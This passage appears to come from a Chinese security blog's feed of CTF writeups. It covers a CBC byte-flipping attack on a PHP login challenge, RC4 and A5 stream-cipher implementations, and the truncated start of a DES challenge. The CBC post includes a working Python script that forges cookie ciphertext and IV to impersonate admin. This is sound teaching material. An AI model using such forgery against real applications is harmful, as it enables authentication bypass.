title="后记"></a>后记</h2><p>我好菜啊，尤其第三道题过程好痛苦啊，不断尝试，最后伪协议哪里，以为两个get变量并行传上去的尝试好久，甚至把其中一个用php:input方法通过post传上去,绝望之后尝试了一次不并行传，一下就出来了.2333，哈哈哈，蠢死自己。真的菜啊！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Pop&quot;&gt;&lt;a href=&quot;#Pop&quot; class=&quot;headerlink&quot; title=&quot;Pop&quot;&gt;&lt;/a&gt;Pop&lt;/h2&gt;&lt;h3 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h3&gt;&lt;f
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>CBC字节翻转</title>
    <link href="http://yoursite.com/2018/01/09/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC/"/>
    <id>http://yoursite.com/2018/01/09/CBC字节翻转/</id>
    <published>2018-01-09T09:24:13.000Z</published>
    <updated>2018-01-11T11:53:31.301Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在前面已经提到过AES—CBC加密的过程，如图:</p><p><img src="/uploads/aes-cbc.jpg" alt="cbc"></p><p>先对明文进行分组，然后分组进行加密，加密之前先要与前一次加密的结果进行一次异或操作（第一次是与一个随机生成的iv进行异或），而解密过程是加密过程的逆，先解密再异或。显然可以改变解密过程与AES解密得到的字符串进行异或的字符串从而改变异或的结果，最终改变CBC模式解密的结果。</p><h2 id="经典例子"><a href="#经典例子" class="headerlink" title="经典例子"></a>经典例子</h2><p>地址：<a href="http://47.93.190.246:49168/" target="_blank" rel="external">http://47.93.190.246:49168/</a></p><p>得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">function get_random_iv()&#123;</div><div class="line">    $random_iv=&apos;&apos;;</div><div class="line">    for($i=0;$i&lt;16;$i++)&#123;</div><div class="line">        $random_iv.=chr(rand(1,255));</div><div class="line">    &#125;</div><div class="line">    return $random_iv;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</div><div class="line">        login($info);</div><div class="line"></div><div class="line">function login($info)&#123;</div><div class="line">    $iv = get_random_iv();</div><div class="line">    $plain = serialize($info);</div><div class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</div><div class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</div><div class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</div><div class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</div><div class="line">&#125;</div><div class="line"></div><div class="line">function check_login()&#123;</div><div class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))</div><div class="line">    &#123;</div><div class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</div><div class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</div><div class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))</div><div class="line">        &#123;</div><div class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</div><div class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">        &#123;</div><div class="line">            die(&quot;ERROR!&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function show_homepage()&#123;</div><div class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</div><div class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</div><div class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</div><div class="line">    &#125;else&#123;</div><div class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</div><div class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</div><div class="line">    &#125;</div><div class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))</div><div class="line">&#123;</div><div class="line">    $username = (string)$_POST[&apos;username&apos;];</div><div class="line">    $password = (string)$_POST[&apos;password&apos;];</div><div class="line">    if($username === &apos;admin&apos;)</div><div class="line">    &#123;</div><div class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</div><div class="line">        login($info);</div><div class="line">        show_homepage();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>随机生成一个iv同序列化后的用户信息进行AES-cbc加密，再将结果进行base64编码传入cookie中。</p><p>对cookie中的iv和密文进行base64解码在进行AES-cbc解密，再把解密后的信息进行反序列化后传给$info，再把$info中$username赋给$_session进行判定。如果是admin就打印flag，但是对登录输入的username进行了限制不允许是admin。</p><p>输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username=aamin</div><div class="line">password=123</div></pre></td></tr></table></figure><p>序列化结果：a:2:{s:8:”username”;s:5:”aamin”;s:8:”password”;s:3:”123”;}</p><p>分组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a:2:&#123;s:8:&quot;userna</div><div class="line">me&quot;;s:5:&quot;aamin&quot;;</div><div class="line">s:8:&quot;password&quot;;s</div><div class="line">:3:&quot;123&quot;;&#125;</div></pre></td></tr></table></figure><p>我们期望第二组中的第11位变成’d’，因此我们可以有：</p><p>cipher = cipher[0:10] + chr(ord(cipher[x])^ord(‘a’)^ord(‘d’)) + cipher[10:]</p><p>这样解密时可以达到我们的预期目标，但此时会出现另外一个问题，解密后反序列化会失败（因为我们对第一组密文进行了修改），我希望解密后第一组明文是’a:2:{s:8:”userna’,于是有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">newIv = &apos;&apos;</div><div class="line">right = &apos;a:2:&#123;s:8:&quot;userna&apos;</div><div class="line">for i in range(16):</div><div class="line">    print right[i]</div><div class="line">    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))</div><div class="line">print &quot;newiv=&quot;,urllib.quote(base64.b64encode(newIv))</div></pre></td></tr></table></figure><p>再把结果放入cookie中传过去就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">import base64,urllib</div><div class="line"></div><div class="line">def get_newCipher(cipher):</div><div class="line">    cipher = base64.b64decode(urllib.unquote(cipher))</div><div class="line">    newCipher = cipher[0:10] + chr(ord(cipher[10])^ord(&apos;a&apos;)^ord(&apos;d&apos;)) + cipher[11:]</div><div class="line">    newCipher = urllib.quote(base64.b64encode(newCipher))</div><div class="line">    print &quot;newcipher=&quot;,newCipher</div><div class="line">    return newCipher</div><div class="line"></div><div class="line">def get_newIV(iv,cipher):</div><div class="line">    cipher = base64.b64decode(urllib.unquote(cipher))</div><div class="line">    print cipher</div><div class="line">    iv = base64.b64decode(urllib.unquote(iv))</div><div class="line">    print iv</div><div class="line">    newIv = &apos;&apos;</div><div class="line">    right = &apos;a:2:&#123;s:8:&quot;userna&apos;</div><div class="line">    for i in range(16):</div><div class="line">        print right[i]</div><div class="line">        newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))</div><div class="line">    print &quot;newiv=&quot;,urllib.quote(base64.b64encode(newIv))</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    iv = &apos;&apos;</div><div class="line">    cipher = &apos;&apos;</div><div class="line">    newcipher = get_newCipher(cipher)</div><div class="line">    get_newIV(iv,newcipher)</div></pre></td></tr></table></figure><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>这和前面的Padding-Oracle-Attack有相似之处都是通过异或操作从而达到某种目的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;在前面已经提到过AES—CBC加密的过程，如图:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/aes-cbc.jpg&quot; alt=&quot;c
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="cbc" scheme="http://yoursite.com/tags/cbc/"/>
    
  </entry>
  
  <entry>
    <title>RC4和A5加密</title>
    <link href="http://yoursite.com/2018/01/06/RC4%E5%92%8CA5%E5%8A%A0%E5%AF%86/"/>
    <id>http://yoursite.com/2018/01/06/RC4和A5加密/</id>
    <published>2018-01-06T10:12:44.000Z</published>
    <updated>2018-01-08T10:45:36.045Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">def RC4_inits(key):</div><div class="line">    sbox = []</div><div class="line">    len_key = len(key)</div><div class="line">    T = []</div><div class="line">    for i in range(0,256):</div><div class="line">        sbox.append(i)</div><div class="line">        T.append(key[i%len_key])</div><div class="line">    j = 0</div><div class="line">    for i in range(0,256):</div><div class="line">        j = (j + sbox[i] + ord(T[j]))%256</div><div class="line">        tmp = sbox[i]</div><div class="line">        sbox[i] = sbox[j]</div><div class="line">        sbox[j] = tmp</div><div class="line">    return sbox</div><div class="line"></div><div class="line">def RC4_initkey(s,data):</div><div class="line">    len_str = len(data)</div><div class="line">    i = 0</div><div class="line">    j = 0</div><div class="line">    key_box = []</div><div class="line">    for k in range(0,len_str):</div><div class="line">        i = (i+1)%256</div><div class="line">        j = (j + s[i])%256</div><div class="line">        tmp = s[i]</div><div class="line">        s[i] = s[j]</div><div class="line">        s[j] = tmp</div><div class="line">        t = (s[i] + s[j])%256</div><div class="line">        key_box.append(s[t])</div><div class="line">    return key_box</div><div class="line"></div><div class="line">def RC4encode(data,key):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(data)):</div><div class="line">        ans += chr(ord(data[i])^key[i])</div><div class="line">    return ans</div><div class="line"></div><div class="line">def RC4decode(code,key):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(code)):</div><div class="line">        ans += chr(ord(code[i])^key[i])</div><div class="line">    return ans</div><div class="line"></div><div class="line">text = &quot;&quot;</div><div class="line">for line in open(&quot;test.txt&quot;):</div><div class="line">    text += line</div><div class="line">key = raw_input(&quot;input key:&quot;)</div><div class="line">sbox = RC4_inits(key)</div><div class="line">key_box = RC4_initkey(sbox,text)</div><div class="line">code = RC4encode(text,key_box)</div><div class="line">f = file(&quot;code.txt&quot;,&quot;w+&quot;)</div><div class="line">f.write(code)</div><div class="line">f.close()</div><div class="line">mw = RC4decode(code,key_box)</div><div class="line">f = file(&quot;mingwen.txt&quot;,&quot;w+&quot;)</div><div class="line">f.write(mw)</div><div class="line">f.close()</div></pre></td></tr></table></figure><h2 id="A5加密算法"><a href="#A5加密算法" class="headerlink" title="A5加密算法"></a>A5加密算法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div></pre></td><td class="code"><pre><div class="line">def str_to_bin(str_input):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in str_input:</div><div class="line">        ans_i = bin(ord(i))[2:]</div><div class="line">        for j in range(0,8-len(ans_i)):</div><div class="line">            ans_i = &apos;0&apos; + ans_i</div><div class="line">        ans += ans_i</div><div class="line">    return ans</div><div class="line"></div><div class="line">def bin_to_str(bin_input):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(bin_input),8):</div><div class="line">        ans_i = chr(int(bin_input[i:i+8],2))</div><div class="line">        ans += ans_i</div><div class="line">    return ans</div><div class="line"></div><div class="line">def bin_to_hex(str_input):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(str_input),8):</div><div class="line">        ans_i = hex(int(str_input[i:i+8],2))[2:]</div><div class="line">        for j in range(0,2-len(ans_i)):</div><div class="line">            ans_i = &apos;0&apos; + ans_i</div><div class="line">        ans += ans_i</div><div class="line">    return ans</div><div class="line"></div><div class="line">def hex_to_bin(str_input):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(str_input),2):</div><div class="line">        ans_i = bin(int(str_input[i:i+2],16))[2:]</div><div class="line">        for j in range(0,8-len(ans_i)):</div><div class="line">            ans_i = &apos;0&apos; + ans_i</div><div class="line">        ans += ans_i</div><div class="line">    return ans</div><div class="line"></div><div class="line">def inti_LFSR(key):</div><div class="line">    key_bin = str_to_bin(key)</div><div class="line">    LFSR_19 = []</div><div class="line">    LFSR_22 = []</div><div class="line">    LFSR_23 = []</div><div class="line">    for i in range(0,64):</div><div class="line">        if i&lt;19:</div><div class="line">            LFSR_19.append(int(key_bin[i]))</div><div class="line">        elif i&lt;41:</div><div class="line">            LFSR_22.append(int(key_bin[i]))</div><div class="line">        else:</div><div class="line">            LFSR_23.append(int(key_bin[i]))</div><div class="line">    LFSR_KEY = [LFSR_19,LFSR_22,LFSR_23]</div><div class="line">    return LFSR_KEY</div><div class="line"></div><div class="line">def get_key(key_lfsr):</div><div class="line">    ans = key_lfsr[0][18]^key_lfsr[1][21]^key_lfsr[2][22]</div><div class="line">    return ans</div><div class="line"></div><div class="line">def Feedback_Poly(key_lfsr):</div><div class="line">    flag = [key_lfsr[0][9],key_lfsr[1][11],key_lfsr[2][11]]</div><div class="line">    num_flag = [0,0]</div><div class="line">    for i in flag:</div><div class="line">        if i == 0:</div><div class="line">            num_flag[0] += 1</div><div class="line">        else:</div><div class="line">            num_flag[1] += 1</div><div class="line">    move_flag = 0</div><div class="line">    if num_flag[1]&gt;num_flag[0]:</div><div class="line">        move_flag = 1</div><div class="line">    for i in range(0,3):</div><div class="line">        if flag[i] == move_flag:</div><div class="line">            key_lfsr[i] = function_move(key_lfsr[i],i)</div><div class="line">    return key_lfsr</div><div class="line"></div><div class="line">def function_move(key_lfsr_i,i):</div><div class="line">    ans = []</div><div class="line">    ans.append(0)</div><div class="line">    for j in range(1,len(key_lfsr_i)):</div><div class="line">        ans.append(key_lfsr_i[j-1])</div><div class="line">    if i == 0:</div><div class="line">        tmp = key_lfsr_i[13]^key_lfsr_i[16]^key_lfsr_i[17]^key_lfsr_i[18]</div><div class="line">    elif i == 1:</div><div class="line">        tmp = key_lfsr_i[12]^key_lfsr_i[16]^key_lfsr_i[20]^key_lfsr_i[21]</div><div class="line">    else:</div><div class="line">        tmp = key_lfsr_i[17]^key_lfsr_i[18]^key_lfsr_i[21]^key_lfsr_i[22]</div><div class="line">    ans[0] = tmp</div><div class="line">    return ans</div><div class="line"></div><div class="line">def A5_encode(str_m,key):</div><div class="line">    str_bin = str_to_bin(str_m)</div><div class="line">    key_lfsr = inti_LFSR(key)</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in str_bin:</div><div class="line">        key_i = get_key(key_lfsr)</div><div class="line">        key_lfsr = Feedback_Poly(key_lfsr)</div><div class="line">        ans_i = int(i)^key_i</div><div class="line">        ans += str(ans_i)</div><div class="line">    ans = bin_to_hex(ans)</div><div class="line">    return ans</div><div class="line"></div><div class="line">def A5_decode(code_hex,key):</div><div class="line">    key_lfsr = inti_LFSR(key)</div><div class="line">    code_bin = hex_to_bin(code_hex)</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in code_bin:</div><div class="line">        key_i = get_key(key_lfsr)</div><div class="line">        key_lfsr = Feedback_Poly(key_lfsr)</div><div class="line">        ans_i = int(i)^key_i</div><div class="line">        ans += str(ans_i)</div><div class="line">    ans = bin_to_str(ans)</div><div class="line">    return ans</div><div class="line"></div><div class="line">text = &quot;&quot;</div><div class="line">for line in open(&quot;test.txt&quot;):</div><div class="line">    text += line</div><div class="line">key = raw_input(&quot;input key:&quot;)</div><div class="line">code = A5_encode(text,key)</div><div class="line">f = file(&quot;code.txt&quot;,&quot;w+&quot;)</div><div class="line">f.write(code)</div><div class="line">f.close()</div><div class="line">print &quot;Encode is OK!&quot;</div><div class="line">str_m = A5_decode(code,key)</div><div class="line">f = file(&quot;mingwen.txt&quot;,&quot;w+&quot;)</div><div class="line">f.write(str_m)</div><div class="line">f.close()</div><div class="line">print &quot;Decode is OK!&quot;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;RC4&quot;&gt;&lt;a href=&quot;#RC4&quot; class=&quot;headerlink&quot; title=&quot;RC4&quot;&gt;&lt;/a&gt;RC4&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;d
      
    
    </summary>
    
      <category term="Crypto" scheme="http://yoursite.com/categories/Crypto/"/>
    
    
      <category term="密码学课程设计" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="RC4" scheme="http://yoursite.com/tags/RC4/"/>
    
      <category term="A5" scheme="http://yoursite.com/tags/A5/"/>
    
  </entry>
  
  <entry>
    <title>平台的一道DES题目</title>
    <link href="http://yoursite.com/2018/01/04/%E5%B9%B3%E5%8F%B0%E7%9A%84%E4%B8%80%E9%81%93DES%E9%A2%98%E7%9B%AE/"/>
    <id>http://yoursite.com/2018/01/04/平台的一道DES题目/</id>
    <published>2018-01-04T12:57:49.000Z</published>
    <updated>2018-01-04T12:59:48.400Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前两周刚撸完DES和AES，趁热打铁做的这道题</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">import pyDes</div><div class="line">deskey = &quot;********&quot;</div><div class="line">DES = pyDes.des(deskey)</div><div class="line">DES.setMode(&apos;ECB&apos;)</div><div class="line">DES.Kn = [</div><div class="line">    [1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1],</div><div class="line">    [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1],</div><div class="line">    [1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1],</div><div class="line">    [1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0],</div><div class="line">    [0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0],</div><div class="line">    [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1],</div><div class="line">    [1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0],</div><div class="line">    [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0],</div><div class="line">    [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1],</div><div class="line">    [0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0],</div><div class="line">    [0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1],</div><div class="line">    [0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0],</div><div class="line">    [1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0],</div><div class="line">    [1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0],</div><div class="line">    [1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1],</div><div class="line">    [1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0]</div><div class="line">]</div><div class="line">#cipher_list = DES.encrypt(mes)</div><div class="line">cipher_list = [&apos;0x6&apos;, &apos;0x58&apos;, &apos;0xbf&apos;, &apos;0xd8&apos;, &apos;0x6d&apos;, &apos;0xbf&apos;, &apos;0x96&apos;, &apos;0x5&apos;, &apos;0xc5&apos;, 